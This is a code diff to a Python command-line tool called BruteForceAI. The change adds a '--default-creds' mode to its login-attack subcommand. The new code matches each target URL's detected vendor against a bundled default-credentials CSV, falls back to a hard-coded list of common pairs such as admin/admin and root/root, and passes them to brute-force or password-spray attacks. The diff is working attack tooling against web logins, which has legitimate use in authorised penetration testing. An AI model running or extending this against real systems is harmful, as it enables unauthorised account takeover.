@@ -112,8 +112,12 @@ Examples:
     # Attack subcommand (formerly stage2)
     attack_parser = subparsers.add_parser('attack', help='Execute login attacks using analyzed selectors')
     attack_parser.add_argument('--urls', required=True, help='File containing URLs (one per line)')
-    attack_parser.add_argument('--usernames', required=True, help='File containing usernames (one per line)')
-    attack_parser.add_argument('--passwords', required=True, help='File containing passwords (one per line)')
+    attack_parser.add_argument('--usernames', help='File containing usernames (one per line)')
+    attack_parser.add_argument('--passwords', help='File containing passwords (one per line)')
+    attack_parser.add_argument('--default-creds', action='store_true',
+                              help='Use default credentials from CSV (filtered by detected vendor)')
+    attack_parser.add_argument('--default-creds-file',
+                              help='Custom default credentials CSV file (default: bundled DefaultCreds-Cheat-Sheet.csv)')
     attack_parser.add_argument('--mode', choices=['bruteforce', 'passwordspray'], default='bruteforce',
                               help='Attack mode: bruteforce (all combinations) or passwordspray (each password against all users)')
     attack_parser.add_argument('--attack', choices=['playwright'], default='playwright',
@@ -334,6 +338,12 @@ def execute_analyze(args):
 
 def execute_attack(args):
     """Execute Attack - Login attacks"""
+    # Validate: need either default-creds or usernames+passwords
+    use_default_creds = getattr(args, 'default_creds', False)
+    if not use_default_creds and (not args.usernames or not args.passwords):
+        print("❌ Error: Either --default-creds or both --usernames and --passwords are required")
+        sys.exit(1)
+
     print("🚀 BruteForceAI Attack - Login Attacks")
     print("=" * 80)
     print(f"Mode: {args.mode}")
@@ -346,8 +356,14 @@ def execute_attack(args):
     print(f"Success exit: {args.success_exit}")
     print(f"User agents: {args.user_agents or 'Default browser'}")
     print(f"URLs file: {args.urls}")
-    print(f"Usernames file: {args.usernames}")
-    print(f"Passwords file: {args.passwords}")
+    if use_default_creds:
+        print(f"Default creds: Enabled (filtered by detected vendor)")
+        if args.default_creds_file:
+            print(f"Default creds file: {args.default_creds_file}")
+    if args.usernames:
+        print(f"Usernames file: {args.usernames}")
+    if args.passwords:
+        print(f"Passwords file: {args.passwords}")
     print(f"Database: {args.database}")
     print(f"Show browser: {args.show_browser}")
     print(f"Browser wait: {args.browser_wait}s")
@@ -373,12 +389,63 @@ def execute_attack(args):
         print(f"Webhooks: None")
     
     print("=" * 80)
-    
+
+    # Handle default credentials mode
+    usernames_file = args.usernames
+    passwords_file = args.passwords
+
+    if use_default_creds:
+        from BruteForceCore import load_default_creds, get_detected_vendor
+
+        # Load URLs to get detected vendors
+        urls = []
+        with open(args.urls, 'r') as f:
+            urls = [line.strip() for line in f if line.strip()]
+
+        # Collect all credentials for all URLs based on detected vendors
+        all_default_creds = []
+        for url in urls:
+            vendor, product = get_detected_vendor(args.database, url)
+            if vendor and vendor != 'unknown':
+                print(f"🔍 {url}: Detected vendor '{vendor}', filtering credentials...")
+                creds = load_default_creds(args.default_creds_file, vendor_filter=vendor)
+                print(f"   Found {len(creds)} matching credentials")
+                all_default_creds.extend(creds)
+            elif product and product != 'unknown':
+                print(f"🔍 {url}: Detected product '{product}', filtering credentials...")
+                creds = load_default_creds(args.default_creds_file, vendor_filter=product)
+                print(f"   Found {len(creds)} matching credentials")
+                all_default_creds.extend(creds)
+            else:
+                print(f"⚠️  {url}: No vendor detected, run 'analyze' first or using generic defaults")
+                # Use common defaults when no vendor detected
+                creds = load_default_creds(args.default_creds_file, vendor_filter=None)
+                # Limit to most common ones
+                common_creds = [('admin', 'admin'), ('admin', 'password'), ('admin', ''), ('root', 'root'), ('root', 'password'), ('user', 'user'), ('admin', '1234'), ('admin', '123456')]
+                all_default_creds.extend(common_creds)
+
+        # Remove duplicates
+        seen = set()
+        unique_creds = []
+        for cred in all_default_creds:
+            if cred not in seen:
+                seen.add(cred)
+                unique_creds.append(cred)
+
+        if unique_creds:
+            # Create temporary credential lists
+            default_usernames = list(set([c[0] for c in unique_creds]))
+            default_passwords = list(set([c[1] for c in unique_creds]))
+            print(f"📋 Total unique credentials: {len(unique_creds)} ({len(default_usernames)} usernames, {len(default_passwords)} passwords)")
+        else:
+            print("❌ No default credentials found")
+            sys.exit(1)
+
     # Initialize BruteForceAI
     bf = BruteForceAI(
         urls_file=args.urls,
-        usernames_file=args.usernames,
-        passwords_file=args.passwords,
+        usernames_file=usernames_file if not use_default_creds else default_usernames,
+        passwords_file=passwords_file if not use_default_creds else default_passwords,
         show_browser=args.show_browser,
         browser_wait=args.browser_wait,
         proxy=args.proxy,
@@ -399,14 +466,14 @@ def execute_attack(args):
         telegram_chat_id=getattr(args, 'telegram_chat_id', None),
         ollama_url=getattr(args, 'ollama_url', None)
     )
-    
+
     # Execute Stage 2
     bf.stage2(
         mode=args.mode,
         attack=args.attack,
         threads=args.threads
     )
-    
+
     print("\n✅ Attack completed!")
 
 def execute_clean_db(args):
